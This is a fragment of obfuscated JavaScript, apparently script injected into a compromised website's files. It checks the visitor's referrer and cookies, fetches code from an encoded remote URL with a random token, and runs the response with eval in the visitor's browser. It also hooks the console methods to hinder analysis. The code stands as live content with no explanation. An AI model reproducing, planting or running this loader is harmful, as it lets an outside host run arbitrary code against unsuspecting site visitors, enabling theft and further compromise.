X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};